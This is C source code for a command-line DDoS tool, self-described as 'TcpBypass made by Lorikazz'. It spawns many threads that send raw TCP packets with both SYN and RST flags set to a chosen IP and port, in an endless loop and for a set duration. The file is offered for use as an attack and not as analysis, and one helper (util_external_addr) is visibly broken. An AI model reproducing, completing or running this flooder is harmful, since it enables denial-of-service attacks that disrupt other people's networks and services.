#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>

#define MAX_SIZE 256

struct pseudo_header {
    u_int32_t src_addr;
    u_int32_t dest_addr;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;

    return answer;
}

uint32_t util_external_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof (addr);

    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = (htonl(""));
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

void *flood(void *arg) {
    char **params = (char **)arg;
    char *target_ip = params[0];
    int target_port = atoi(params[1]);

    int sock;
    struct sockaddr_in dest;
    char packet[MAX_SIZE];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_header psh;

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket creation failed");
        exit(-1);
    }

    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    dest.sin_addr.s_addr = inet_addr(target_ip);

    memset(packet, 0, MAX_SIZE);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = util_external_addr();
    iph->daddr = dest.sin_addr.s_addr;

    tcph->source = htons(rand() % 65535 + 1);
    tcph->dest = htons(target_port);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    psh.src_addr = iph->saddr;
    psh.dest_addr = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    char *pseudogram = malloc(sizeof(struct pseudo_header) + sizeof(struct tcphdr));

    while (1) {
        iph->id = htonl(rand());

        tcph->syn = 1;
        tcph->rst = 1;

        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

        iph->check = calculate_checksum((unsigned short *)packet, iph->tot_len);
        tcph->check = calculate_checksum((unsigned short *)pseudogram, sizeof(struct pseudo_header) + sizeof(struct tcphdr));
        tcph->urg_ptr = 1;
        sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest));
        //free(pseudogram);
    }
    free(pseudogram);

}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("TcpBypass made by Lorikazz\nUsage: %s <ip> <port> <threads> <time>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int threads = atoi(argv[3]);

    pthread_t thread_ids[threads];
    char *params[2] = {target_ip, argv[2]};
    int i;
    for (i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, &flood, params) != 0) {
            perror("Thread creation failed");
            return 1;
        }
    }

    for(i = 0; i < (atoi(argv[4]) * 20); i++)
    {
        usleep((1000 / 20) * 1000);
        //pthread_exit(thread_ids[i]);
    }
    return 0;
}
